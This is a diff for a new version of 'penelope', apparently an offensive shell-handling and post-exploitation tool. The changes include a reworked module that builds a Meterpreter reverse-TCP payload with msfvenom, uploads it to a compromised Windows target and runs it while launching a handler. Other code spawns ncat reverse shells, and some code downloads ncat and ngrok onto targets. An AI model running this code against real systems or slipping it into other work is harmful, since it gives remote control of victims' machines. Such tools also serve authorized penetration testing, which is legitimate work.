@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.21.5"
+__version__ = "0.21.6"
 
 import os
 import io
@@ -125,6 +125,18 @@ def Open(item, terminal=False):
 		stdout=subprocess.DEVNULL,
 		stderr=subprocess.PIPE
 	)
+
+	if not terminal:
+		try:
+			process.wait(timeout=2)
+		except subprocess.TimeoutExpired:
+			return True
+		if process.returncode != 0:
+			error = process.stderr.read().decode(errors="replace").strip()
+			logger.error(f"Could not open '{item}'" + (f": {error}" if error else f" (exit code {process.returncode})"))
+			return False
+		return True
+
 	r, _, _ = select([process.stderr], [], [], .01)
 	if process.stderr in r:
 		error = os.read(process.stderr.fileno(), 1024)
@@ -672,6 +684,9 @@ class BetterCMD:
 		if not line:
 			return None, None, line
 		elif line[0] == '!':
+			if not readline:
+				cmdlogger.error("Command history recall requires readline support")
+				return None, None, line
 			index = line[1:].strip()
 			hist_len = readline.get_current_history_length()
 
@@ -2737,8 +2752,9 @@ class Session:
 						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
 						response = self.exec(
 							f'for bin in {" ".join(missing)}; do for dir in '
-							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
-							'test -f $_bin && break || unset _bin; done; echo $_bin; done'
+							f'$(printf %s "$PATH" | tr ":" " ") '
+							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; '
+							'test -x "$_bin" && break || unset _bin; done; echo "$_bin"; done'
 						)
 						if response:
 							self._bin.update(dict(zip(missing, response.decode(errors="replace").splitlines())))
@@ -2838,6 +2854,19 @@ class Session:
 				self.upgrade()
 			return func(self, *args, **kwargs)
 		return newfunc
+
+	def require(*binaries):
+		def inner(func):
+			@wraps(func)
+			def newfunc(self, *args, **kwargs):
+				if self.OS == 'Unix' and not self.agent:
+					for binary in binaries:
+						if not self.bin[binary]:
+							logger.error(f"'{binary}' binary is not available at the target. Cannot {func.__name__}...")
+							return []
+				return func(self, *args, **kwargs)
+			return newfunc
+		return inner
 
 	def tcp_signal(self):
 		TCP_INFO = getattr(socket, 'TCP_INFO', None)
@@ -3674,6 +3703,7 @@ class Session:
 
 	@persistent_shell_only
 	@prefer_agent
+	@require('tar', 'base64', 'tr', 'cut')
 	def download(self, remote_items):
 		# Initialization
 		try:
@@ -3802,7 +3832,12 @@ class Session:
 				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
 				for error in errors:
 					logger.error(error)
-				send_size = self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'", value=True)
+				send_size = self.exec(
+					rf"(stat -x {temp} 2>/dev/null || stat {temp} 2>/dev/null) "
+					rf"| sed -n 's/.*Size: \([0-9]*\).*/\1/p' "
+					rf"| grep . || wc -c < {temp}",
+					value=True
+				)
 				if not (isinstance(send_size, str) and send_size.strip().isdigit()):
 					logger.error("Could not determine the remote file size")
 					return []
@@ -3889,7 +3924,13 @@ class Session:
 				stdout_stream << remote_paths.encode()
 				""", python=True, value=True)
 			else:
-				cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo "$file"; fi; done'
+				cmd = (
+					'_abspath(){ if [ -d "$1" ]; then (cd "$1" && pwd);'
+					' else echo "$(cd "$(dirname "$1")" && pwd)/$(basename "$1")"; fi; };'
+					f' for file in {remote_items}; do if [ -e "$file" ]; then'
+					' readlink -f "$file" 2>/dev/null || _abspath "$file";'
+					' else echo "$file"; fi; done'
+				)
 				response = self.exec(cmd, timeout=None, value=True)
 				if not response:
 					logger.error("Cannot get remote paths")
@@ -3972,6 +4013,7 @@ class Session:
 
 	@persistent_shell_only
 	@prefer_agent
+	@require('base64', 'tar', 'cat')
 	def upload(self, local_items, remote_path=None, randomize_fname=False, url_to_bytes_fn=None):
 
 		url_to_bytes_fn = url_to_bytes_fn or url_to_bytes
@@ -3988,14 +4030,6 @@ class Session:
 		except ValueError as e:
 			logger.error(e)
 			return []
-
-		# Check for necessary binaries
-		if self.OS == 'Unix' and not self.agent:
-			dependencies = ['echo', 'base64', 'tar', 'rm']
-			for binary in dependencies:
-				if not self.bin[binary]:
-					logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
-					return []
 
 		# Resolve items
 		resolved_items = []
@@ -4046,9 +4080,9 @@ class Session:
 				if isinstance(remote_available_kb, str) and remote_available_kb.isdigit():
 					remote_space = int(remote_available_kb) * 1024
 
-			if not (remote_block_size and remote_space is not None):
-				logger.error("Could not determine remote free space... Upload aborted")
-				return []
+			if not remote_block_size:
+				remote_block_size = 4096  # fallback
+				logger.warning("Could not determine remote block size; assuming 4096")
 
 			# Calculate local size
 			local_size = 0
@@ -4059,13 +4093,16 @@ class Session:
 					local_size += get_glob_size(shlex.quote(str(item)), remote_block_size, options.link_dereference)
 
 			# Check required space
-			need = local_size - remote_space
-			if need > 0:
-				logger.error(
-					f"--- Not enough space on target... {paint('We need ').blue}"
-					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
-				)
-				return []
+			if remote_space is None:
+				logger.warning("Could not determine remote free space; proceeding without the space check")
+			else:
+				need = local_size - remote_space
+				if need > 0:
+					logger.error(
+						f"--- Not enough space on target... {paint('We need ').blue}"
+						f"{paint().yellow}{need:,}{paint().blue} more bytes..."
+					)
+					return []
 
 			# Start Uploading
 			if self.agent:
@@ -4397,8 +4434,8 @@ class Session:
 							logger.error(f"Cannot listen on {host}:{port}. Spawning shell aborted")
 							return False
 
-				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
 				if self.agent:
+					logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
 					self.exec(f"""
 						import os, socket
 						if os.fork() == 0:
@@ -4420,7 +4457,10 @@ class Session:
 					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
 					if not (self._ncat and not self.exec(f"test -x {self._ncat} || echo x")):
 						logger.warning("ncat is not available on the target")
-						self._ncat = self.need_binary("ncat", URLS['ncat'])
+						if self.system == 'Linux' and self.arch == 'x86_64':
+							self._ncat = self.need_binary("ncat", URLS['ncat'])
+						else:
+							logger.error(f"No prebuilt ncat binary for {self.system}/{self.arch}")
 					if not self._ncat:
 						logger.error("Spawning shell aborted")
 						return False
@@ -5474,6 +5514,9 @@ class ngrok(Module):
 			if not session.exec_tmp:
 				logger.error("No writable+executable directory on the target (noexec?)")
 				return False
+			if session.arch != 'x86_64':
+				logger.error(f"No prebuilt ngrok binary for arch '{session.arch}'")
+				return False
 			_, archive = url_to_bytes(URLS['ngrok_linux'])
 			if not archive:
 				logger.error("Failed to download ngrok")
@@ -5578,6 +5621,7 @@ class upload_local_exploits(Module):
 			except Exception as e:
 				logger.error(f"Failed to upload {tool}: {e}")
 
+
 class meterpreter(Module):
 	def run(session, args):
 		"""
@@ -5585,44 +5629,68 @@ class meterpreter(Module):
 		"""
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
-		else:
-			fd, payload_path = tempfile.mkstemp(suffix=".exe")
-			os.close(fd)
+			return
 
-			host = session._host
-			port = 5555
+		if not shutil.which("msfvenom"):
+			logger.error("'msfvenom' not found locally. Install Metasploit to use this module.")
+			return
+		if not shutil.which("msfconsole"):
+			logger.warning("'msfconsole' not found locally; you'll need to start the handler manually")
 
-			arch = ''
-			if session.arch == "x64-based_PC":
-				arch = 'x64/'
+		parser = ArgumentParser(prog="meterpreter", description="Spawn a Meterpreter session")
+		parser.add_argument("-p", "--port", type=int, default=5555, help="Handler/LPORT (default: 5555)")
+		parser.add_argument("-H", "--host", "--lhost", default=None, help="LHOST (default: jump host if set, else the session's local address)")
+		try:
+			opts = parser.parse_args(shlex.split(args) if args else [])
+		except SystemExit:
+			return
+		host, port = opts.host, opts.port
+		if not (0 < port < 65536):
+			logger.error(f"Invalid port: {port}")
+			return
 
-			try:
-				logger.info("Creating payload...")
-				payload_creation_cmd = ["msfvenom", "-p", f"windows/{arch}meterpreter/reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "exe", "-o", payload_path]
-
-				print(payload_creation_cmd)
-				result = subprocess.run(payload_creation_cmd, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-				if result.returncode == 0:
-					logger.info("Payload created!")
-					uploaded_path = session.upload(payload_path, session.tmp)
-					if uploaded_path:
-						meterpreter_handler_cmd = (
-							'msfconsole -x "use exploit/multi/handler; '
-							f'set payload windows/{arch}meterpreter/reverse_tcp; '
-							f'set LHOST {host}; set LPORT {port}; run"'
-						)
-						Open(meterpreter_handler_cmd, terminal=True)
-						logger.info("Starting handler...")
-						print(meterpreter_handler_cmd)
-						session.exec(uploaded_path[0], force_cmd=True)
+		if host is None:
+			if session.listener and session.listener.jump:
+				if len(session.listener.jump) == 1:
+					host = session.listener.jump[0][0]
 				else:
-					logger.error(f"Cannot create meterpreter payload: {result.stderr}")
-			finally:
-				try:
-					os.remove(payload_path)
-				except FileNotFoundError:
-					pass
+					[print(f"* {j[0]}:{j[1]}") for j in session.listener.jump]
+					while True:
+						e = ask("Endpoint (host:port): ")
+						host = e.split(":")[0].strip()
+						if host:
+							break
+						logger.error(f"Invalid endpoint: {e}")
+			else:
+				host = session._host
+
+		arch = 'x64/' if session.arch == "x64-based_PC" else ''
+
+		with tempfile.TemporaryDirectory(prefix="penelope-msf-") as tmpdir:
+			payload_path = os.path.join(tmpdir, f"{rand(10)}.exe")
+
+			logger.info("Creating payload...")
+			payload_creation_cmd = ["msfvenom", "-p", f"windows/{arch}meterpreter/reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "exe", "-o", payload_path]
+			print(payload_creation_cmd)
+			result = subprocess.run(payload_creation_cmd, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+			if result.returncode != 0:
+				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
+				return
+
+			logger.info("Payload created!")
+			uploaded_path = session.upload(payload_path, session.tmp)
+			if uploaded_path:
+				meterpreter_handler_cmd = (
+					'msfconsole -x "use exploit/multi/handler; '
+					f'set payload windows/{arch}meterpreter/reverse_tcp; '
+					f'set LHOST {host}; set LPORT {port}; run"'
+				)
+				Open(meterpreter_handler_cmd, terminal=True)
+				logger.info("Starting handler...")
+				print(meterpreter_handler_cmd)
+				session.exec(f'start "" "{uploaded_path[0]}"', force_cmd=True, timeout=2) # TEMP fix with timeout
+
 
 class cleanup(Module):
 	def run(session, args):
